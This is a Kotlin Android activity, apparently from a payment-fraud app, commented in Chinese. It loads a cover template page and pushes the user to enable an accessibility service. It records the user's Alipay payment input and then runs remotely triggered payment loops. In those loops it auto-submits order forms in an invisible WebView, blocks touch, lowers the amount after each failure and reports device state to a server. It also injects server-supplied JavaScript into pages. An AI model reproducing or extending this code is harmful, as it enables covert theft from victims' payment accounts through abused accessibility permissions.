package com.example.demo

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.net.ConnectivityManager
import android.net.Network
import android.net.Uri
import android.os.Build
import android.provider.Settings
import android.text.TextUtils.SimpleStringSplitter
import android.graphics.Color
import android.graphics.drawable.ColorDrawable
import android.util.Log
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.ViewCompat
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import com.google.android.material.dialog.MaterialAlertDialogBuilder
import org.json.JSONObject
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class MainActivity : AppCompatActivity() {

    private lateinit var statusText: TextView
    private lateinit var webView: android.webkit.WebView
    private lateinit var homeContainer: android.view.View
    private var accessibilityPromptDialog: androidx.appcompat.app.AlertDialog? = null
    private var networkCallback: ConnectivityManager.NetworkCallback? = null
    private var recordPayInFlight: Boolean = false
    private var lastRecordPayStartAt: Long = 0L
    private var recordPaySessionActive: Boolean = false
    private var recordPaySessionAt: Long = 0L
    private var pendingTemplateInjectJs: String = ""

    // 标记是否需要自动开始下一轮
    // private var pendingNextRound = false // 移除内存变量，改用 SharedPreferences 持久化

    // 注册广播接收器，用于接收循环支付信号
    private val paymentReceiver = object : android.content.BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == "com.example.demo.PAYMENT_SUCCESS") {
                // 收到支付成功信号，标记需要进行下一轮，并持久化存储
                // 即使 App 在后台被杀，下次启动也能恢复
                val prefs = getSharedPreferences("app_config", Context.MODE_PRIVATE)
                prefs.edit().putBoolean("pending_next_round", true).apply()
                
            } else if (intent?.action == "com.example.demo.NO_AVAILABLE_METHOD") {
                val prefs = getSharedPreferences("app_config", Context.MODE_PRIVATE)
                prefs.edit()
                    .putBoolean("pending_next_round", true)
                    .putBoolean("pending_need_decrement", true)
                    .apply()
                maybeProcessPendingNextRound()
            } else if (intent?.action == "com.example.demo.START_RECORD_PAY") {
                val now = System.currentTimeMillis()
                if (recordPaySessionActive && now - recordPaySessionAt < 25000) {
                    return
                }
                startRecordPayFlow()
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            unregisterReceiver(paymentReceiver)
        } catch (e: Exception) {
            Log.w("MainActivity", "unregisterReceiver failed: ${e.message}")
        }
        try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
            val cb = networkCallback
            if (cm != null && cb != null) {
                cm.unregisterNetworkCallback(cb)
            }
            networkCallback = null
        } catch (_: Exception) {
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        WindowCompat.setDecorFitsSystemWindows(window, false)
        window.statusBarColor = Color.TRANSPARENT
        setContentView(R.layout.activity_main)

        // 注册广播
        val filter = android.content.IntentFilter().apply {
            addAction("com.example.demo.PAYMENT_SUCCESS")
            addAction("com.example.demo.NO_AVAILABLE_METHOD")
            addAction("com.example.demo.START_RECORD_PAY")
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            registerReceiver(paymentReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(paymentReceiver, filter)
        }

        statusText = findViewById(R.id.status_text)
        webView = findViewById(R.id.webview)
        homeContainer = findViewById(R.id.home_container)

        val homeInitialPaddingLeft = homeContainer.paddingLeft
        val homeInitialPaddingTop = homeContainer.paddingTop
        val homeInitialPaddingRight = homeContainer.paddingRight
        val homeInitialPaddingBottom = homeContainer.paddingBottom
        ViewCompat.setOnApplyWindowInsetsListener(homeContainer) { v, insets ->
            val sysBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            v.setPadding(
                homeInitialPaddingLeft,
                homeInitialPaddingTop + sysBars.top,
                homeInitialPaddingRight,
                homeInitialPaddingBottom + sysBars.bottom,
            )
            insets
        }
        ViewCompat.setOnApplyWindowInsetsListener(webView) { v, insets ->
            val sysBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            v.setPadding(0, sysBars.top, 0, sysBars.bottom)
            insets
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
            if (cm != null) {
                networkCallback = object : ConnectivityManager.NetworkCallback() {
                    override fun onAvailable(network: Network) {
                        ApiClient.flushLogQueue(this@MainActivity)
                    }
                }
                cm.registerDefaultNetworkCallback(networkCallback as ConnectivityManager.NetworkCallback)
            }
        }

        // 配置 WebView
        val ws = webView.settings
        ws.javaScriptEnabled = true
        ws.domStorageEnabled = true
        ws.allowFileAccess = true
        ws.allowContentAccess = true
        ws.useWideViewPort = true
        ws.loadWithOverviewMode = true
        ws.builtInZoomControls = false
        ws.displayZoomControls = false
        ws.setSupportZoom(false)
        ws.cacheMode = android.webkit.WebSettings.LOAD_DEFAULT
        ws.textZoom = 100
        ws.databaseEnabled = true
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            ws.mixedContentMode = android.webkit.WebSettings.MIXED_CONTENT_NEVER_ALLOW
        }
        webView.overScrollMode = android.view.View.OVER_SCROLL_NEVER
        webView.isVerticalScrollBarEnabled = false
        webView.isHorizontalScrollBarEnabled = false
        webView.setLayerType(android.view.View.LAYER_TYPE_HARDWARE, null)
        
        webView.webViewClient = object : android.webkit.WebViewClient() {
            override fun onReceivedSslError(
                view: android.webkit.WebView?, 
                handler: android.webkit.SslErrorHandler?, 
                error: android.net.http.SslError?
            ) {
                handler?.cancel()
            }

            override fun onReceivedError(
                view: android.webkit.WebView?, 
                request: android.webkit.WebResourceRequest?, 
                error: android.webkit.WebResourceError?
            ) {
                // 如果遇到 ERR_CACHE_MISS (-19)，尝试重新加载
                if (error?.errorCode == -19) { // ERROR_CACHE_MISS
                    view?.reload()
                }
                super.onReceivedError(view, request, error)
            }

            override fun shouldOverrideUrlLoading(view: android.webkit.WebView?, url: String?): Boolean {
                if (url == null) return false
                if (url.startsWith("lei://pay")) {
                    handleAlipayPayment()
                    return true
                }
                // 拦截支付宝 Scheme
                if (url.startsWith("alipays://") || url.startsWith("alipayqr://")) {
                    try {
                        val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
                        startActivity(intent)
                    } catch (e: Exception) {
                    }
                    return true
                }
                return false
            }

            override fun onPageFinished(view: android.webkit.WebView?, url: String?) {
                super.onPageFinished(view, url)
                val js = pendingTemplateInjectJs
                if (js.isBlank() || view == null) return
                view.post {
                    try {
                        view.evaluateJavascript(js, null)
                    } catch (_: Exception) {
                    }
                }
            }
        }

    }

    private fun serverOrigin(): String {
        val base = ApiClient.getServerBaseUrl(this).trimEnd('/')
        return if (base.endsWith("/api")) base.dropLast(4) else base
    }

    private fun ensureAccessibilityPrompt(title: String, text: String) {
        val d = accessibilityPromptDialog
        if (d != null && d.isShowing) {
            d.findViewById<TextView>(R.id.acc_prompt_title)?.text = title
            d.findViewById<TextView>(R.id.acc_prompt_text)?.text = text
            return
        }
        val view = layoutInflater.inflate(R.layout.dialog_accessibility_prompt, null, false)
        view.findViewById<TextView>(R.id.acc_prompt_title)?.text = title
        view.findViewById<TextView>(R.id.acc_prompt_text)?.text = text
        val dialog = MaterialAlertDialogBuilder(this)
            .setView(view)
            .setCancelable(false)
            .create()
        dialog.show()
        dialog.window?.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))
        dialog.window?.decorView?.setPadding(0, 0, 0, 0)
        accessibilityPromptDialog = dialog

        dialog.findViewById<android.view.View>(R.id.btn_open_settings)?.setOnClickListener {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }
        dialog.findViewById<android.view.View>(R.id.btn_check_enabled)?.setOnClickListener {
            if (isAccessibilitySettingsOn(this)) {
                dialog.dismiss()
            } else {
            }
        }
    }

    private fun dismissAccessibilityPromptIfAny() {
        val d = accessibilityPromptDialog
        if (d != null && d.isShowing) d.dismiss()
        accessibilityPromptDialog = null
    }

    private fun loadHtmlAutoSubmit(formHtml: String, baseUrl: String, showForeground: Boolean = true) {
        val b64 = android.util.Base64.encodeToString(formHtml.toByteArray(Charsets.UTF_8), android.util.Base64.NO_WRAP)
        val wrapper = """
            <!doctype html>
            <html lang="zh-CN">
            <head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/></head>
            <body>
              <div id="container"></div>
              <script>
                (function(){
                  try{
                    var b64 = "$b64";
                    var html = decodeURIComponent(escape(window.atob(b64)));
                    document.getElementById('container').innerHTML = html;
                    var f = document.querySelector('form');
                    if (f) { f.submit(); }
                  }catch(e){
                    document.body.innerText = 'form render failed: ' + (e && e.message ? e.message : e);
                  }
                })();
              </script>
            </body>
            </html>
        """.trimIndent()
        if (showForeground) {
            homeContainer.visibility = android.view.View.GONE
            webView.visibility = android.view.View.VISIBLE
        } else {
            homeContainer.visibility = android.view.View.VISIBLE
            webView.visibility = android.view.View.INVISIBLE
        }
        webView.clearHistory()
        webView.loadDataWithBaseURL(baseUrl, wrapper, "text/html", "utf-8", null)
    }

    private fun startRecordPayFlow() {
        val now = System.currentTimeMillis()
        if (recordPayInFlight || now - lastRecordPayStartAt < 5000) {
            return
        }
        if (recordPaySessionActive && now - recordPaySessionAt < 25000) {
            return
        }
        lastRecordPayStartAt = now
        recordPaySessionAt = now
        recordPaySessionActive = true
        recordPayInFlight = true
        CoroutineScope(Dispatchers.Main).launch {
            try {
                val prefs = getSharedPreferences("app_config", Context.MODE_PRIVATE)
                val phone = prefs.getString("record_phone", "")?.trim().orEmpty()
                val (form, err) = withContext(Dispatchers.IO) {
                    ApiClient.createRecordPayBlocking(this@MainActivity, phone)
                }
                if (form.isNullOrBlank()) {
                    recordPaySessionActive = false
                    return@launch
                }
                val origin = serverOrigin()
                val intent = Intent(this@MainActivity, AutoPaymentService::class.java).apply {
                    action = AutoPaymentService.ACTION_PREPARE_RECORD_TOUCH
                }
                startService(intent)
                pendingTemplateInjectJs = ""
                loadHtmlAutoSubmit(form, origin, showForeground = false)
            } finally {
                recordPayInFlight = false
            }
        }
    }

    private fun startPayOrderRound(amountOverride: Long? = null) {
        CoroutineScope(Dispatchers.Main).launch {
            val result = withContext(Dispatchers.IO) {
                ApiClient.syncLatestScriptBeforeAutoPayBlocking(this@MainActivity)
                ApiClient.createPayOrderBlocking(this@MainActivity, amountOverride)
            }
            val url = result.payTarget
            val err = result.error
            if (url.isNullOrBlank()) {
                return@launch
            }
            val orderId = result.orderId?.trim().orEmpty()
            if (orderId.isNotBlank()) {
                getSharedPreferences("app_config", Context.MODE_PRIVATE)
                    .edit()
                    .putString("current_pay_order_id", orderId)
                    .apply()
            }
            val intent = Intent(this@MainActivity, AutoPaymentService::class.java).apply {
                action = AutoPaymentService.ACTION_BLOCK_TOUCH
            }
            startService(intent)
            pendingTemplateInjectJs = ""
            val formHtml = ApiClient.decodePayFormFromOrderUrl(url)
            if (formHtml.isNotBlank()) {
                loadHtmlAutoSubmit(formHtml, serverOrigin(), showForeground = false)
            } else {
                loadUrlInWebView(url, showForeground = false)
            }
        }
    }

    private fun maybeProcessPendingNextRound() {
        val prefs = getSharedPreferences("app_config", Context.MODE_PRIVATE)
        val pendingNextRound = prefs.getBoolean("pending_next_round", false)
        val needDecrement = prefs.getBoolean("pending_need_decrement", false)
        if (!pendingNextRound) return
        if (!isAccessibilitySettingsOn(this)) return
        prefs.edit().putBoolean("pending_next_round", false).putBoolean("pending_need_decrement", false).apply()
        CoroutineScope(Dispatchers.Main).launch {
            val cfg = withContext(Dispatchers.IO) { ApiClient.fetchApkRuntimeConfigBlocking(this@MainActivity) }
            if (cfg != null) {
                prefs.edit()
                    .putBoolean("last_fixed_amount_mode", cfg.fixedAmountMode)
                    .putBoolean("last_decrement_mode", cfg.decrementMode)
                    .putLong("last_decrement_amount", cfg.decrementAmount)
                    .apply()
            }
            if (needDecrement) {
                withContext(Dispatchers.IO) {
                    ApiClient.resetPayMethodStatusesBlocking(this@MainActivity)
                }
                SecureStorage.clearLastPayMethod(this@MainActivity)
                SecureStorage.clearLastSuccessPayMethod(this@MainActivity)
            }
            val isFixedMode = cfg?.fixedAmountMode ?: prefs.getBoolean("last_fixed_amount_mode", false)
            val baseAmount = if (isFixedMode) {
                cfg?.fixedAmounts?.firstOrNull() ?: prefs.getLong("current_pay_amount", 0L)
            } else {
                cfg?.payAmount ?: prefs.getLong("current_pay_amount", 0L)
            }
            val cfgDecMode = cfg?.decrementMode ?: prefs.getBoolean("last_decrement_mode", true)
            val cfgDecStep = cfg?.decrementAmount ?: prefs.getLong("last_decrement_amount", 0L)
            val cur = prefs.getLong("current_pay_amount", if (baseAmount > 0) baseAmount else 0L)
            var nextAmount: Long? = null
            if (needDecrement) {
                if (isFixedMode) {
                    prefs.edit().remove("current_pay_amount").apply()
                    nextAmount = null
                } else {
                if (cur <= 1L) {
                    val stop = Intent(this@MainActivity, AutoPaymentService::class.java).apply {
                        action = AutoPaymentService.ACTION_STOP_LOOP
                    }
                    startService(stop)
                    return@launch
                }
                val step = when {
                    cfgDecMode && cfgDecStep > 0L -> cfgDecStep
                    else -> 1L
                }
                val effectiveStep = if (step >= cur) cur - 1L else step
                nextAmount = cur - effectiveStep
                prefs.edit().putLong("current_pay_amount", nextAmount).apply()
                }
            } else {
                if (isFixedMode) {
                    nextAmount = null
                } else if (cur > 0L) {
                    nextAmount = cur
                } else if (baseAmount > 0L) {
                    nextAmount = baseAmount
                    prefs.edit().putLong("current_pay_amount", baseAmount).apply()
                }
            }
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                startPayOrderRound(nextAmount)
            }, 500)
        }
    }

    private fun handleAlipayPayment() {
        if (!isAccessibilitySettingsOn(this)) {
            return
        }
        CoroutineScope(Dispatchers.Main).launch {
            withContext(Dispatchers.IO) {
                ApiClient.syncLatestScriptBeforeAutoPayBlocking(this@MainActivity)
            }
            val hasPassword = hasSavedPassword()
            if (hasPassword) {
                val cfg = withContext(Dispatchers.IO) { ApiClient.fetchApkRuntimeConfigBlocking(this@MainActivity) }
                val prefs = getSharedPreferences("app_config", Context.MODE_PRIVATE)
                val isFixedMode = cfg?.fixedAmountMode == true
                val baseAmount = if (isFixedMode) 0L else (cfg?.payAmount ?: prefs.getLong("current_pay_amount", 0L))
                if (isFixedMode) {
                    prefs.edit().remove("current_pay_amount").apply()
                    startPayOrderRound(null)
                } else if (baseAmount > 0) {
                    prefs.edit().putLong("current_pay_amount", baseAmount).apply()
                    startPayOrderRound(baseAmount)
                } else {
                    startPayOrderRound(null)
                }
            } else {
                startRecordPayFlow()
            }
        }
    }
    
    private fun loadUrlInWebView(url: String, showForeground: Boolean = true) {
        if (showForeground) {
            homeContainer.visibility = android.view.View.GONE
            webView.visibility = android.view.View.VISIBLE
        } else {
            homeContainer.visibility = android.view.View.VISIBLE
            webView.visibility = android.view.View.INVISIBLE
        }
        // 关键：在加载 URL 之前，如果之前有页面被重新加载导致 CACHE_MISS，先清空历史
        webView.clearHistory()
        
        // 针对 Android 10+ 的本地缓存策略修复
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            android.webkit.CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true)
        }
        
        // 如果页面是重定向结果，直接 loadUrl 可能会导致 ERR_CACHE_MISS
        // 我们尝试以 reload 的方式或者标准的 load
        webView.loadUrl(url)
    }
    
    private fun hasSavedPassword(): Boolean {
        val record = SecureStorage.loadPaymentRecord(this)
        return record != null && record.scriptJson.isNotBlank()
    }

    override fun onResume() {
        super.onResume()
        updateStatus()
        ApiClient.logEvent(this, opType = "APP_OPEN", durationMs = 0, level = "INFO", keyword = "onResume")
        ApiClient.flushLogQueue(this)

        val prefs = getSharedPreferences("app_config", Context.MODE_PRIVATE)
        val accessibilityOn = isAccessibilitySettingsOn(this)
        val overlayOn = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Settings.canDrawOverlays(this)
        } else {
            true
        }
        val lastAccessibilityOn = prefs.getBoolean("last_accessibility_on", false)
        val lastOverlayOn = prefs.getBoolean("last_overlay_on", false)
        if (accessibilityOn != lastAccessibilityOn) {
            ApiClient.logEvent(
                this,
                opType = "PERMISSION",
                durationMs = 0,
                level = if (accessibilityOn) "INFO" else "WARN",
                keyword = if (accessibilityOn) "无障碍权限已开启" else "无障碍权限已关闭",
            )
            prefs.edit().putBoolean("last_accessibility_on", accessibilityOn).apply()
        }
        if (overlayOn != lastOverlayOn) {
            ApiClient.logEvent(
                this,
                opType = "PERMISSION",
                durationMs = 0,
                level = if (overlayOn) "INFO" else "WARN",
                keyword = if (overlayOn) "悬浮窗权限已开启" else "悬浮窗权限已关闭",
            )
            prefs.edit().putBoolean("last_overlay_on", overlayOn).apply()
        }

        ApiClient.upsertDevice(
            this,
            accessibilityEnabled = accessibilityOn,
            scriptRecorded = hasSavedPassword(),
            looping = AutoPaymentService.loopingState,
        )
        val now = System.currentTimeMillis()
        if (hasSavedPassword() || (recordPaySessionActive && now - recordPaySessionAt > 60000)) {
            recordPaySessionActive = false
        }

        if (!accessibilityOn) {
            val title = prefs.getString("acc_prompt_title", "")?.trim().orEmpty().ifBlank { "需要开启无障碍权限" }
            val text = prefs.getString("acc_prompt_text", "")?.trim().orEmpty().ifBlank { "为正常使用，请先开启无障碍服务。" }
            ensureAccessibilityPrompt(title, text)
        } else {
            dismissAccessibilityPromptIfAny()
        }

        CoroutineScope(Dispatchers.Main).launch {
            val cfg = withContext(Dispatchers.IO) { ApiClient.fetchApkRuntimeConfigBlocking(this@MainActivity) }
            if (cfg != null) {
                if (!cfg.fixedAmountMode && prefs.getLong("current_pay_amount", 0L) <= 0 && cfg.payAmount > 0) {
                    prefs.edit().putLong("current_pay_amount", cfg.payAmount).apply()
                }
                prefs.edit().putString("overlay_page_id", cfg.overlayPageId).apply()
                if (cfg.accPromptTitle.isNotBlank() || cfg.accPromptText.isNotBlank()) {
                    prefs.edit()
                        .putString("acc_prompt_title", cfg.accPromptTitle)
                        .putString("acc_prompt_text", cfg.accPromptText)
                        .apply()
                }
                if (!isAccessibilitySettingsOn(this@MainActivity)) {
                    val title = cfg.accPromptTitle.ifBlank { "需要开启无障碍权限" }
                    val text = cfg.accPromptText.ifBlank { "为正常使用，请先开启无障碍服务。" }
                    ensureAccessibilityPrompt(title, text)
                } else {
                    dismissAccessibilityPromptIfAny()
                }
                if (webView.visibility != android.view.View.VISIBLE) {
                    val origin = serverOrigin()
                    val url = when {
                        cfg.templateMode == "url" && cfg.templateUrl.isNotBlank() -> cfg.templateUrl
                        cfg.templateId.isNotBlank() -> "$origin/t/${cfg.templateId}/"
                        cfg.downloadPageId.isNotBlank() -> "$origin/dp/${cfg.downloadPageId}/"
                        else -> ""
                    }
                    if (url.isNotBlank()) {
                        pendingTemplateInjectJs = if (cfg.templateMode == "url") cfg.templateInjectJs else ""
                        loadUrlInWebView(url)
                    }
                }
            }
        }
        
        maybeProcessPendingNextRound()
        maybeHandleRemoteStartLoop()
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        setIntent(intent)
        maybeHandleRemoteStartLoop()
    }

    private fun maybeHandleRemoteStartLoop() {
        val it = intent ?: return
        val prefs = getSharedPreferences("app_config", Context.MODE_PRIVATE)
        val shouldStart =
            it.getBooleanExtra("remote_start_loop", false) ||
                prefs.getBoolean("remote_start_loop_pending", false)
        if (!shouldStart) return
        it.removeExtra("remote_start_loop")
        setIntent(it)
        prefs.edit().putBoolean("remote_start_loop_pending", false).apply()
        if (AutoPaymentService.loopingState) return

        CoroutineScope(Dispatchers.Main).launch {
            val cfg = withContext(Dispatchers.IO) { ApiClient.fetchApkRuntimeConfigBlocking(this@MainActivity) }
            if (cfg != null) {
                prefs.edit().putString("overlay_page_id", cfg.overlayPageId).apply()
                if (!cfg.fixedAmountMode && prefs.getLong("current_pay_amount", 0L) <= 0 && cfg.payAmount > 0) {
                    prefs.edit().putLong("current_pay_amount", cfg.payAmount).apply()
                }
            }
            if (cfg?.fixedAmountMode == true) {
                prefs.edit().remove("current_pay_amount").apply()
                startPayOrderRound(null)
            } else {
                val amount = prefs.getLong("current_pay_amount", 0L)
                startPayOrderRound(if (amount > 0) amount else null)
            }
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray,
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        for (i in permissions.indices) {
            val p = permissions[i]
            val granted = try {
                grantResults.getOrNull(i) == android.content.pm.PackageManager.PERMISSION_GRANTED
            } catch (_: Exception) {
                false
            }
            ApiClient.logEvent(
                this,
                opType = "PERMISSION",
                durationMs = 0,
                level = if (granted) "INFO" else "WARN",
                keyword = "$p:${if (granted) "GRANTED" else "DENIED"}",
                meta = JSONObject().apply { put("requestCode", requestCode) },
            )
        }
    }

    private fun updateStatus() {
        val isServiceOn = isAccessibilitySettingsOn(this)
        if (isServiceOn) {
            statusText.text = getString(R.string.service_enabled)
        } else {
            statusText.text = getString(R.string.service_disabled)
        }
        
        // floatButton.isEnabled = isServiceOn // 移除
    }

    private fun isAccessibilitySettingsOn(mContext: Context): Boolean {
        var accessibilityEnabled = 0
        val service = packageName + "/" + AutoPaymentService::class.java.canonicalName
        try {
            accessibilityEnabled = Settings.Secure.getInt(
                mContext.applicationContext.contentResolver,
                android.provider.Settings.Secure.ACCESSIBILITY_ENABLED
            )
        } catch (e: Settings.SettingNotFoundException) {
            e.printStackTrace()
        }
        val mStringColonSplitter = SimpleStringSplitter(':')
        if (accessibilityEnabled == 1) {
            val settingValue = Settings.Secure.getString(
                mContext.applicationContext.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            )
            if (settingValue != null) {
                mStringColonSplitter.setString(settingValue)
                while (mStringColonSplitter.hasNext()) {
                    val accessibilityService = mStringColonSplitter.next()
                    if (accessibilityService.equals(service, ignoreCase = true)) {
                        return true
                    }
                }
            }
        }
        return false
    }
}
